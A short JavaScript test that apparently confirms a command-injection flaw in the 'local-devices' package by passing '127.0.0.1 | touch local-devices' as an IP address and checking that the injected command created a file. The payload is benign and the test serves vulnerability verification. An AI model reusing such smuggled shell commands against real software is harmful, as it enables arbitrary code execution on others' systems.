test("Arbitrary code execution in local-devices", () => {
  expect.assertions(2);
  const fs = require("fs");
  const find = require("local-devices");
  const path = "./local-devices";
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  let userInput = "127.0.0.1 | touch local-devices";
  return find(userInput).then(() => {
    file_exist = fs.existsSync(path);
    expect(file_exist).toBe(true);
    fs.unlink(path, function (err) {});
  });
});
